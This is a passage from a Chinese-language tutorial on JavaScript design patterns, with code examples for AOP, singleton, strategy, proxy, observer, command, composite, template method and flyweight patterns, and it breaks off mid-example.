<div><pre><code><span>const</span> <span>composePromise</span> <span>=</span>
  <span>(</span><span><span>...</span>fns</span><span>)</span> <span>=></span>
  <span>(</span><span><span>...</span>args</span><span>)</span> <span>=></span>
    fns<span>.</span><span>reduceRight</span><span>(</span>
      <span>(</span><span>seq<span>,</span> fn</span><span>)</span> <span>=></span> seq<span>.</span><span>then</span><span>(</span><span>res</span> <span>=></span> <span>fn</span><span>(</span>res<span>)</span><span>)</span><span>,</span>
      Promise<span>.</span><span>resolve</span><span>(</span>fns<span>.</span><span>pop</span><span>(</span><span>)</span><span>(</span><span>...</span>args<span>)</span><span>)</span>
    <span>)</span>

<span>const</span> <span>foo</span> <span>=</span> <span>ms</span> <span>=></span>
  <span>new</span> <span>Promise</span><span>(</span><span>resolve</span> <span>=></span> <span>setTimeout</span><span>(</span><span>_</span> <span>=></span> <span>resolve</span><span>(</span>ms <span>+</span> <span>1000</span><span>)</span><span>,</span> ms<span>)</span><span>)</span>
<span>composePromise</span><span>(</span>foo<span>,</span> foo<span>)</span><span>(</span><span>1000</span><span>)</span><span>.</span><span>then</span><span>(</span>console<span>.</span>log<span>)</span> <span>// 约 3 秒后打印 3000</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br></div></div></li>
<li>
<p><a href="https://juejin.cn/post/6844903959283367950#heading-57" target="_blank" rel="noopener noreferrer">ES 提案了一种管道操作符操作</a>（从左向右执行）。</p>
<div><pre><code><span>const</span> <span>add</span> <span>=</span> <span>num</span> <span>=></span> num <span>+</span> <span>7</span>

<span>7</span> <span>></span><span>|</span> add <span>></span><span>|</span> add <span>// => 21</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br></div></div></li>
</ul>
<h2 id="_9-面向切面编程-aop"> 9. 面向切面编程（AOP）</h2>
<ul>
<li>
<p>AOP 是针对业务处理过程中的切面进行提取。对重复的非主业务代码进行抽离，降低耦合性，提高代码的复用性，提高开发效率。</p>
<blockquote>
<p>应用：错误处理，埋点，日志等。</p>
</blockquote>
</li>
</ul>
<div><pre><code><span>Function</span><span>.</span>prototype<span>.</span><span>before</span> <span>=</span> <span>function</span><span>(</span><span>callback</span><span>)</span> <span>{</span>
  <span>if</span> <span>(</span><span>typeof</span> callback <span>!==</span> <span>'function'</span><span>)</span>
    <span>throw</span> <span>new</span> <span>TypeError</span><span>(</span><span>'callback is not a function'</span><span>)</span>
  <span>const</span> self <span>=</span> <span>this</span>
  <span>return</span> <span>function</span><span>(</span><span><span>...</span>args</span><span>)</span> <span>{</span>
    <span>callback</span><span>.</span><span>call</span><span>(</span><span>this</span><span>,</span> <span>...</span>args<span>)</span>
    <span>return</span> <span>self</span><span>.</span><span>call</span><span>(</span><span>this</span><span>,</span> <span>...</span>args<span>)</span>
  <span>}</span>
<span>}</span>
<span>Function</span><span>.</span>prototype<span>.</span><span>after</span> <span>=</span> <span>function</span><span>(</span><span>callback</span><span>)</span> <span>{</span>
  <span>if</span> <span>(</span><span>typeof</span> callback <span>!==</span> <span>'function'</span><span>)</span>
    <span>throw</span> <span>new</span> <span>TypeError</span><span>(</span><span>'callback is not a function'</span><span>)</span>
  <span>const</span> self <span>=</span> <span>this</span>
  <span>return</span> <span>function</span><span>(</span><span><span>...</span>args</span><span>)</span> <span>{</span>
    <span>const</span> result <span>=</span> <span>self</span><span>.</span><span>call</span><span>(</span><span>this</span><span>,</span> <span>...</span>args<span>)</span>
    <span>callback</span><span>.</span><span>call</span><span>(</span><span>this</span><span>,</span> <span>...</span>args<span>)</span>
    <span>return</span> result
  <span>}</span>
<span>}</span>

<span>function</span> <span>middle</span><span>(</span><span>)</span> <span>{</span>
  console<span>.</span><span>log</span><span>(</span><span>'middle'</span><span>)</span>
  <span>return</span> <span>'result'</span>
<span>}</span>

middle<span>.</span><span>before</span><span>(</span><span>_</span> <span>=></span> console<span>.</span><span>log</span><span>(</span><span>'before'</span><span>)</span><span>)</span><span>.</span><span>after</span><span>(</span><span>_</span> <span>=></span> console<span>.</span><span>log</span><span>(</span><span>'after'</span><span>)</span><span>)</span><span>(</span><span>)</span> <span>// => 依次打印：'before' -> 'middle' -> 'after' -> 'result'</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br></div></div><h2 id="_10-单例模式"> 10. 单例模式</h2>
<ul>
<li>
<p>保证一个类仅有一个实例，并提供一个访问它的全局访问点。</p>
<blockquote>
<p>应用：登录弹窗等。</p>
</blockquote>
</li>
</ul>
<div><pre><code><span>const</span> <span>getSingle</span> <span>=</span> <span>fn</span> <span>=></span> <span>{</span>
  <span>let</span> result
  <span>return</span> <span>function</span><span>(</span><span><span>...</span>args</span><span>)</span> <span>{</span>
    <span>return</span> result <span>||</span> <span>(</span>result <span>=</span> <span>fn</span><span>.</span><span>apply</span><span>(</span><span>this</span><span>,</span> args<span>)</span><span>)</span>
  <span>}</span>
<span>}</span>

<span>const</span> <span>createModal</span> <span>=</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
  <span>const</span> modal <span>=</span> document<span>.</span><span>createElement</span><span>(</span><span>'div'</span><span>)</span>
  modal<span>.</span>innerHTML <span>=</span> <span>'登录弹窗'</span>
  modal<span>.</span>style<span>.</span>display <span>=</span> <span>'none'</span>
  document<span>.</span>body<span>.</span><span>appendChild</span><span>(</span>modal<span>)</span>
  <span>return</span> modal
<span>}</span>

<span>const</span> createSingleModal <span>=</span> <span>getSingle</span><span>(</span>createModal<span>)</span>

<span>createSingleModal</span><span>(</span><span>)</span> <span>===</span> <span>createSingleModal</span><span>(</span><span>)</span> <span>// => true</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br></div></div><h2 id="_11-策略模式"> 11. 策略模式</h2>
<ul>
<li>
<p>定义一系列的算法，把它们一个个封装起来，并且使它们可以相互替换。</p>
<blockquote>
<p>在 JavaScript 这种将函数作为一等对象的语言里，策略模式已经融入到了语言本身当中。我们经常用高阶函数来封装不同的行为，并且把它传递到另一个函数中。</p>
</blockquote>
</li>
</ul>
<div><pre><code><span>const</span> strategies <span>=</span> <span>{</span>
  <span>S</span><span>:</span> <span>salary</span> <span>=></span> salary <span>*</span> <span>4</span><span>,</span>
  <span>A</span><span>:</span> <span>salary</span> <span>=></span> salary <span>*</span> <span>3</span><span>,</span>
  <span>B</span><span>:</span> <span>salary</span> <span>=></span> salary <span>*</span> <span>2</span><span>,</span>
<span>}</span>

<span>const</span> <span>calculateBonus</span> <span>=</span> <span>(</span><span>level<span>,</span> salary</span><span>)</span> <span>=></span> strategies<span>[</span>level<span>]</span><span>(</span>salary<span>)</span>

<span>calculateBonus</span><span>(</span><span>'S'</span><span>,</span> <span>777</span><span>)</span> <span>// => 3108</span>
<span>calculateBonus</span><span>(</span><span>'A'</span><span>,</span> <span>777</span><span>)</span> <span>// => 2331</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br></div></div><h2 id="_12-代理模式"> 12. 代理模式</h2>
<ul>
<li>
<p>代理模式是为一个对象提供一个代用品或占位符，以便控制对它的访问。</p>
<blockquote>
<p>应用：Vue 3.x 版本数据响应式等。</p>
</blockquote>
</li>
</ul>
<div><pre><code><span>const</span> foo <span>=</span> <span>{</span>
  <span>name</span><span>:</span> <span>'徐扶墙'</span><span>,</span>
  <span>age</span><span>:</span> <span>17</span><span>,</span>
  <span>wife</span><span>:</span> <span>[</span><span>'姜姒'</span><span>,</span> <span>'裴南苇'</span><span>]</span><span>,</span>
  <span>skill</span><span>:</span> <span>{</span>
    <span>name</span><span>:</span> <span>'天下第二'</span><span>,</span>
  <span>}</span><span>,</span>
<span>}</span>

<span>const</span> proxy <span>=</span> <span>new</span> <span>Proxy</span><span>(</span>foo<span>,</span> <span>{</span>
  <span>get</span><span>(</span>target<span>,</span> key<span>)</span> <span>{</span>
    <span>if</span> <span>(</span>key <span>===</span> <span>'wife'</span><span>)</span> console<span>.</span><span>log</span><span>(</span><span>'风紧，扯呼！'</span><span>)</span>
    <span>return</span> target<span>[</span>key<span>]</span>
  <span>}</span><span>,</span>
  <span>set</span><span>(</span>target<span>,</span> key<span>,</span> value<span>)</span> <span>{</span>
    console<span>.</span><span>log</span><span>(</span><span>'裆下有些忧郁啊！'</span><span>)</span> <span>// 设置 proxy.skill.name 的值时不会打印这句话</span>
    <span>return</span> <span>(</span>target<span>[</span>key<span>]</span> <span>=</span> value<span>)</span>
  <span>}</span><span>,</span>
<span>}</span><span>)</span>

proxy<span>.</span>wife <span>// '风紧，扯呼！'</span>
proxy<span>.</span>name <span>=</span> <span>'徐凤年'</span> <span>// '裆下有些忧郁啊！'</span>
proxy<span>.</span>skill<span>.</span>name <span>=</span> <span>'天下第一'</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br></div></div><h2 id="_13-迭代器模式"> 13. 迭代器模式</h2>
<ul>
<li>
<p>迭代器模式是指提供一种方法顺序访问一个聚合对象中的各个元素，而又不需要暴露该对象的内部表示。</p>
</li>
<li>
<p>迭代器模式是一种相对简单的模式，简单到很多时候我们都不认为它是一种设计模式。目前的绝大部分语言都内置了迭代器。</p>
</li>
</ul>
<div><pre><code><span>[</span><span>'jack'</span><span>,</span> <span>'pony'</span><span>,</span> <span>'coderljw'</span><span>]</span><span>.</span><span>map</span><span>(</span><span>i</span> <span>=></span> console<span>.</span><span>log</span><span>(</span>i<span>)</span><span>)</span> <span>// 依次打印：'jack' -> 'pony' -> 'coderljw'</span>
</code></pre>
<div><span>1</span><br></div></div><h2 id="_14-发布订阅模式-观察者模式"> 14. 发布订阅模式（观察者模式）</h2>
<ul>
<li>
<p>发布订阅模式又叫观察者模式，它定义对象间的一种一对多的依赖关系，当一个对象的状态发生改变时，所有依赖于它的对象都将得到通知。</p>
<blockquote>
<p>应用：DOM2 和 Vue 中的响应式原理、事件监听等。</p>
</blockquote>
</li>
<li>
<p>也可以先发布再订阅。例如微信离线消息，离线消息被保存在服务器中，接收人下次登录上线之后，可以重新收到这条消息。</p>
</li>
<li>
<p>一部分人认为发布订阅模式与观察者模式是两种模式，认为发布订阅模式是观察者模式的解耦表达。设计模式表达的是程序设计思想，他们区分的发布订阅模式与观察者模式在思想上是一致的。</p>
</li>
</ul>
<div><pre><code><span>class</span> <span>Observer</span> <span>{</span>
  message <span>=</span> <span>{</span><span>}</span>
  <span>// 监听事件</span>
  <span>on</span><span>(</span><span>type<span>,</span> cb</span><span>)</span> <span>{</span>
    <span>if</span> <span>(</span>type <span>in</span> <span>this</span><span>.</span>message<span>)</span> <span>this</span><span>.</span>message<span>[</span>type<span>]</span><span>.</span><span>push</span><span>(</span>cb<span>)</span>
    <span>else</span> <span>this</span><span>.</span>message<span>[</span>type<span>]</span> <span>=</span> <span>[</span>cb<span>]</span>
  <span>}</span>
  <span>// 触发事件</span>
  <span>emit</span><span>(</span><span>type<span>,</span> <span>...</span>args</span><span>)</span> <span>{</span>
    <span>if</span> <span>(</span>type <span>in</span> <span>this</span><span>.</span>message<span>)</span> <span>this</span><span>.</span>message<span>[</span>type<span>]</span><span>.</span><span>forEach</span><span>(</span><span>cb</span> <span>=></span> <span>cb</span><span>(</span><span>...</span>args<span>)</span><span>)</span>
  <span>}</span>
  <span>// 取消事件中指定的订阅</span>
  <span>off</span><span>(</span><span>type<span>,</span> cb</span><span>)</span> <span>{</span>
    <span>if</span> <span>(</span>type <span>in</span> <span>this</span><span>.</span>message<span>)</span>
      <span>this</span><span>.</span>message<span>[</span>type<span>]</span> <span>=</span> <span>this</span><span>.</span>message<span>[</span>type<span>]</span><span>.</span><span>filter</span><span>(</span><span>fn</span> <span>=></span> fn <span>!==</span> cb<span>)</span>
  <span>}</span>
  <span>// 取消事件</span>
  <span>offAll</span><span>(</span><span>type</span><span>)</span> <span>{</span>
    <span>if</span> <span>(</span>type <span>in</span> <span>this</span><span>.</span>message<span>)</span> <span>delete</span> <span>this</span><span>.</span>message<span>[</span>type<span>]</span>
  <span>}</span>
<span>}</span>

<span>const</span> event <span>=</span> <span>new</span> <span>Observer</span><span>(</span><span>)</span>

<span>const</span> <span>handlerClick1</span> <span>=</span> <span>(</span><span><span>...</span>args</span><span>)</span> <span>=></span> console<span>.</span><span>log</span><span>(</span><span>'click1'</span><span>,</span> <span>...</span>args<span>)</span>

event<span>.</span><span>on</span><span>(</span><span>'click'</span><span>,</span> handlerClick1<span>)</span>
event<span>.</span><span>on</span><span>(</span><span>'click'</span><span>,</span> <span>(</span><span><span>...</span>args</span><span>)</span> <span>=></span> console<span>.</span><span>log</span><span>(</span><span>'click2'</span><span>,</span> <span>...</span>args<span>)</span><span>)</span>
event<span>.</span><span>off</span><span>(</span><span>'click'</span><span>,</span> handlerClick1<span>)</span>
<span>setTimeout</span><span>(</span><span>_</span> <span>=></span> event<span>.</span><span>emit</span><span>(</span><span>'click'</span><span>,</span> <span>'徐扶墙'</span><span>,</span> <span>'南宫仆射'</span><span>)</span><span>,</span> <span>3000</span><span>)</span> <span>// 3秒后打印：'click2 徐扶墙 南宫仆射'</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br></div></div><h2 id="_15-命令模式"> 15. 命令模式</h2>
<ul>
<li>
<p>命令模式是最简单和优雅的模式之一，命令模式中的命令（command）指的是一个执行某些特定事情的指令。</p>
<blockquote>
<p>JavaScript 作为将函数作为一等对象的语言，跟策略模式一样，命令模式也早已融入到了 JavaScript 语言之中。</p>
</blockquote>
</li>
</ul>
<div><pre><code><span>const</span> <span>bindClick</span> <span>=</span> <span>(</span><span>button<span>,</span> func</span><span>)</span> <span>=></span> <span>{</span>
  button<span>.</span>onclick <span>=</span> func
<span>}</span>

<span>const</span> MenuBar <span>=</span> <span>{</span>
  <span>refresh</span><span>(</span><span>)</span> <span>{</span>
    console<span>.</span><span>log</span><span>(</span><span>'刷新菜单界面'</span><span>)</span>
  <span>}</span><span>,</span>
<span>}</span>

<span>const</span> SubMenu <span>=</span> <span>{</span>
  <span>add</span><span>(</span><span>)</span> <span>{</span>
    console<span>.</span><span>log</span><span>(</span><span>'增加子菜单'</span><span>)</span>
  <span>}</span><span>,</span>
  <span>del</span><span>(</span><span>)</span> <span>{</span>
    console<span>.</span><span>log</span><span>(</span><span>'删除子菜单'</span><span>)</span>
  <span>}</span><span>,</span>
<span>}</span>

<span>bindClick</span><span>(</span>button1<span>,</span> MenuBar<span>.</span>refresh<span>)</span>
<span>bindClick</span><span>(</span>button2<span>,</span> SubMenu<span>.</span>add<span>)</span>
<span>bindClick</span><span>(</span>button3<span>,</span> SubMenu<span>.</span>del<span>)</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br></div></div><h2 id="_16-组合模式"> 16. 组合模式</h2>
<ul>
<li>
<p>组合模式将对象组合成树形结构，以表示 “部分——整体” 的层次结构。除了用来表示树形结构之外，组合模式的另一个好处是通过对象的多态性表现，使得用户对单个对象和组合对象的使用具有一致性。</p>
<blockquote>
<p>应用：文件目录，DOM 文档树。</p>
</blockquote>
</li>
<li>
<p>组合模式应树形结构而生，所以组合模式的使用场景就是出现树形结构的地方。</p>
<blockquote>
<ul>
<li>命令分发：只需要通过请求树的最顶层对象，便能对整棵树做统一的操作。在组合模式中增加和删除树的节点非常方便，并且符合开放-封闭原则。</li>
<li>统一处理：统一对待树中的所有对象，忽略组合对象和叶对象的区别。</li>
</ul>
</blockquote>
</li>
</ul>
<div><pre><code><span>// 文件夹（树对象）</span>
<span>class</span> <span>Folder</span> <span>{</span>
  files <span>=</span> <span>[</span><span>]</span>
  <span>constructor</span><span>(</span><span>name</span><span>)</span> <span>{</span>
    <span>this</span><span>.</span>name <span>=</span> name
  <span>}</span>
  <span>add</span><span>(</span><span>file</span><span>)</span> <span>{</span>
    <span>this</span><span>.</span>files<span>.</span><span>push</span><span>(</span>file<span>)</span>
  <span>}</span>
  <span>scan</span><span>(</span><span>)</span> <span>{</span>
    console<span>.</span><span>log</span><span>(</span><span><span>`</span><span>开始扫描文件夹：</span><span><span>${</span><span>this</span><span>.</span>name<span>}</span></span><span>`</span></span><span>)</span>
    <span>this</span><span>.</span>files<span>.</span><span>forEach</span><span>(</span><span>file</span> <span>=></span> file<span>.</span><span>scan</span><span>(</span><span>)</span><span>)</span>
  <span>}</span>
<span>}</span>

<span>// 文件（叶对象）</span>
<span>class</span> <span>File</span> <span>{</span>
  <span>constructor</span><span>(</span><span>name</span><span>)</span> <span>{</span>
    <span>this</span><span>.</span>name <span>=</span> name
  <span>}</span>
  <span>add</span><span>(</span><span>file</span><span>)</span> <span>{</span>
    <span>throw</span> <span>new</span> <span>Error</span><span>(</span><span>'文件下面不能再添加文件'</span><span>)</span>
  <span>}</span>
  <span>scan</span><span>(</span><span>)</span> <span>{</span>
    console<span>.</span><span>log</span><span>(</span><span><span>`</span><span>开始扫描文件：</span><span><span>${</span><span>this</span><span>.</span>name<span>}</span></span><span>`</span></span><span>)</span>
  <span>}</span>
<span>}</span>

<span>const</span> filmTV <span>=</span> <span>new</span> <span>Folder</span><span>(</span><span>'影视'</span><span>)</span>
<span>const</span> matrixFolder <span>=</span> <span>new</span> <span>Folder</span><span>(</span><span>'Matrix'</span><span>)</span>
<span>const</span> onePieceFolder <span>=</span> <span>new</span> <span>Folder</span><span>(</span><span>'ワンピース'</span><span>)</span>

<span>const</span> matrix <span>=</span> <span>new</span> <span>File</span><span>(</span><span>'The Matrix.mp4'</span><span>)</span>
<span>const</span> onePiece <span>=</span> <span>new</span> <span>File</span><span>(</span><span>'俺はルフィ！海賊王になる男だ！.mp4'</span><span>)</span>

matrixFolder<span>.</span><span>add</span><span>(</span>matrix<span>)</span>
onePieceFolder<span>.</span><span>add</span><span>(</span>onePiece<span>)</span>
filmTV<span>.</span><span>add</span><span>(</span>matrixFolder<span>)</span>
filmTV<span>.</span><span>add</span><span>(</span>onePieceFolder<span>)</span>
filmTV<span>.</span><span>scan</span><span>(</span><span>)</span> <span>// 依次打印：'开始扫描文件夹：影视' -> '开始扫描文件夹：Matrix' -> '开始扫描文件：The Matrix.mp4' -> '开始扫描文件夹：ワンピース' -> '开始扫描文件：俺はルフィ！海賊王になる男だ！.mp4'</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br></div></div><h2 id="_17-模板方法模式"> 17. 模板方法模式</h2>
<ul>
<li>
<p>模板方法模式是一种只需使用继承就可以实现的非常简单的模式。</p>
<blockquote>
<p>优点：容易扩展和便于维护。</p>
</blockquote>
</li>
<li>
<p>在 JavaScript 中，我们很多时候都不需要依样画瓢地去实现一个模版方法模式，高阶函数是更好的选择。</p>
</li>
</ul>
<div><pre><code><span>class</span> <span>Beverage</span> <span>{</span>
  <span>boilWater</span><span>(</span><span>)</span> <span>{</span>
    console<span>.</span><span>log</span><span>(</span><span>'把水煮沸'</span><span>)</span>
  <span>}</span>
  <span>// 以下为空方法，应该由子类重写</span>
  <span>brew</span><span>(</span><span>)</span> <span>{</span><span>}</span>
  <span>pourInCup</span><span>(</span><span>)</span> <span>{</span><span>}</span>
  <span>addCondiments</span><span>(</span><span>)</span> <span>{</span><span>}</span>
  <span>// 模板方法</span>
  <span>init</span><span>(</span><span>)</span> <span>{</span>
    <span>[</span><span>'boilWater'</span><span>,</span> <span>'brew'</span><span>,</span> <span>'pourInCup'</span><span>,</span> <span>'addCondiments'</span><span>]</span><span>.</span><span>map</span><span>(</span><span>fn</span> <span>=></span> <span>this</span><span>[</span>fn<span>]</span><span>(</span><span>)</span><span>)</span>
  <span>}</span>
<span>}</span>

<span>class</span> <span>Coffee</span> <span>extends</span> <span>Beverage</span> <span>{</span>
  <span>brew</span><span>(</span><span>)</span> <span>{</span>
    console<span>.</span><span>log</span><span>(</span><span>'用沸水冲泡咖啡'</span><span>)</span>
  <span>}</span>
  <span>pourInCup</span><span>(</span><span>)</span> <span>{</span>
    console<span>.</span><span>log</span><span>(</span><span>'把咖啡倒进杯子'</span><span>)</span>
  <span>}</span>
  <span>addCondiments</span><span>(</span><span>)</span> <span>{</span>
    console<span>.</span><span>log</span><span>(</span><span>'加糖和牛奶'</span><span>)</span>
  <span>}</span>
<span>}</span>

<span>const</span> coffee <span>=</span> <span>new</span> <span>Coffee</span><span>(</span><span>)</span>
coffee<span>.</span><span>init</span><span>(</span><span>)</span> <span>// 依次打印：'把水煮沸' -> '用沸水冲泡咖啡' -> '把咖啡倒进杯子' -> '加糖和牛奶'</span>

<span>class</span> <span>Tea</span> <span>extends</span> <span>Beverage</span> <span>{</span>
  <span>brew</span><span>(</span><span>)</span> <span>{</span>
    console<span>.</span><span>log</span><span>(</span><span>'用沸水浸泡茶叶'</span><span>)</span>
  <span>}</span>
  <span>pourInCup</span><span>(</span><span>)</span> <span>{</span>
    console<span>.</span><span>log</span><span>(</span><span>'把茶倒进杯子'</span><span>)</span>
  <span>}</span>
  <span>addCondiments</span><span>(</span><span>)</span> <span>{</span>
    console<span>.</span><span>log</span><span>(</span><span>'加柠檬'</span><span>)</span>
  <span>}</span>
<span>}</span>

<span>const</span> tea <span>=</span> <span>new</span> <span>Tea</span><span>(</span><span>)</span>
tea<span>.</span><span>init</span><span>(</span><span>)</span> <span>// 依次打印：'把水煮沸' -> '用沸水浸泡茶叶' -> '把茶倒进杯子' -> '加柠檬'</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br></div></div><h2 id="_18-享元模式"> 18. 享元模式</h2>
<ul>
<li>
<p>享元（flyweight）模式是一种用于性能优化的模式，“fly” 在这里是苍蝇的意思，意为蝇量级。享元模式的核心是运用共享技术来有效支持大量细粒度的对象。</p>
<blockquote>
<p>应用：B 站弹幕等。</p>
</blockquote>
</li>
<li>
<p>对象池是另外一种性能优化方案，它跟享元模式有一些相似之处，但没有分离内部状态和外部状态这个过程。</p>
</li>
</ul>
<div><pre><code><span>const</span> <span>FILMQUANTITY</span> <span>=</span> <span>10000</span><span>,</span>
  <span>DIVHEIGHT</span> <span>=</span> <span>25</span><span>,</span>
  <span>POOLQUANTITY</span> <span>=</span> <span>20</span>

<span>const</span> films <span>=</span> <span>Array</span><span>(</span><span>FILMQUANTITY</span><span>)</span>
  <span>.</span><span>fill</span><span>(</span><span>0</span><span>)</span>
  <span>.</span><span>map</span><span>(</span><span>(</span><span>_<span>,</span> index</span><span>)</span> <span>=></span> <span>(</span><span>{</span>
    <span>name</span><span>:</span> <span><span>`</span><span><span>${</span>Math<span>.</span><span>random</span><span>(</span><span>)</span>
      <span>.</span><span>toString</span><span>(</span><span>36</span><span>)</span>
      <span>.</span><span>substr</span><span>(</span><span>2</span><span>,</span> <span>10</span><span>)</span><span>}</span></span><span> --- </span><span><span>${</span>index<span>}</span></span><span>`</span></span><span>,</span>
    <span>category</span><span>:</span> Math<span>.</span><span>random</span><span>(</span><span>)</span> <span>></span> <span>0.5</span> <span>?</span> <span>'SecondDimension'</span> <span>:</span> <span>'ThirdDimension'</span><span>,</span>
  <span>}</span><span>)</span><span>)</span>

<span>// film 享元对象</span>
<span>class</span> <span>FilmFlyweight</span> <span>{</span>
  <span>constructor</span><span>(</span><span>category</span><span>)</span> <span>{</span>
    <span>// 定义内部状态</span>
    <span>this</span><span>.</span>category <span>=</span> category
  <span>}</span>
  <span>// 设置外部状态</span>
  <span>setExternalState</span><span>(</span><span>state</span><span>)</span> <span>{</span>
    Object<span>.</span><span>entries</span><span>(</span>state<span>)</span><span>.</span><span>forEach</span><span>(</span><span>(</span><span><span>[</span>key<span>,</span> value<span>]</span></span><span>)</span> <span>=></span> <span>this</span><span>[</span>key<span>]</span> <span>=</span> value<span>)</span>
  <span>}</span>
  <span>getState</span><span>(</span><span>)</span> <span>{</span>
    <span>const</span> <span>{</span> name<span>,</span> category <span>}</span> <span>=</span> <span>this</span>
    <span>return</span> <span>{</span> name<span>,</span> category <span>}</span>
  <span>}</span>
<span>}</span>

<span>// 创建享元对象（单例模式）</span>
<span>const</span> createFilmFlyweight <span>=</span> <span>(</span><span>function</span><span>(</span><span>)</span> <span>{</span>
  <span>const</span> store <span>=</span> <span>{</span><span>}</span>
  <span>return</span> <span>function</span><span>(</span><span>category</span><span>)</span> <span>{</span>
    <span>if</span> <span>(</span><span>!</span>store<span>[</span>category<span>]</span><span>)</span> <span>return</span> <span>(</span>store<span>[</span>category<span>]</span> <span>=</span> <span>new</span> <span>FilmFlyweight</span><span>(</span>category<span>)</span><span>)</span>
    <span>return</span> store<span>[</span>category<span>]</span>
  <span>}</span>
<span>}</span><span>)</span><span>(</span><span>)</span>

<span>// div 享元对象</span>
<span>class</span> <span>Div</span> <span>{</span>
  node <span>=</span> document<span>.</span><span>createElement</span><span>(</span><span>'div'</span><span>)</span>
  <span>// 设置外部状态</span>
  <span>setExternalState</span><span>(</span><span><span>{</span> text<span>,</span> serialNumber <span>}</span><span>,</span> onClick</span><span>)</span> <span>{</span>
    <span>const</span> <span>{</span> node <span>}</span> <span>=</span> <span>this</span>
    node<span>.</span>innerText <span>=</span> text
    node<span>.</span>style<span>.</span>position <span>=</span> <span>'absolute'</span>
    node<span>.</span>style<span>.</span>top <span>=</span> <span><span>`</span><span><span>${</span>serialNumber <span>*</span> <span>DIVHEIGHT</span><span>}</span></span><span>px</span><span>`</span></span>
    node<span>.</span>onclick <span>=</span> onClick
  <span>}</span>
<span>}</span>

<span>// 创建 div 享元对象</span>
<span>const</span> createDiv <span>=</span> <span>(</span><span>function</span><span>(</span><span>)</span> <span>{</span>
  <span>// 对象池</span>
  <span>const</span> pool <span>=</span> <span>[</span><span>]</span>
  <span>return</span> <span>function</span><span>(</span><span>container</span><span>)</span> <span>{</span>
    <span>let</span> div
    <span>if</span> <span>(</span>pool<span>.</span>length <span>&lt;=</span> <span>POOLQUANTITY</span><span>)</span> div <span>=</span> <span>new</span> <span>Div</span><span>(</span><span>)</span>
    <span>else</span> div <span>=</span> pool<span>.</span><span>shift</span><span>(</span><span>)</span>

    pool<span>.</span><span>push</span><span>(</span>div<span>)</span>
    container<span>.</span><span>appendChild</span><span>(</span>div<span>.</span>node<span>)</span>
    <span>return</span> div
  <span>}</span>
<span>}</span><span>)</span><span>(</span><span>)</span>

<span>// 创建容器</span>
<span>const</span> <span>{</span> outerContainer<span>,</span> innerContainer <span>}</span> <span>=</span> <span>(</span><span>function</span><span>(</span><span>)</span> <span>{</span>
  <span>const</span> outerContainer <span>=</span> document<span>.</span><span>createElement</span><span>(</span><span>'div'</span><span>)</span>
  <span>const</span> innerContainer <span>=</span> document<span>.</span><span>createElement</span><span>(</span><span>'div'</span><span>)</span>

  outerStyle <span>=</span> <span>{</span>
    <span>width</span><span>:</span> <span>'200px'</span><span>,</span>
    <span>height</span><span>:</span> <span>'400px'</span><span>,</span>
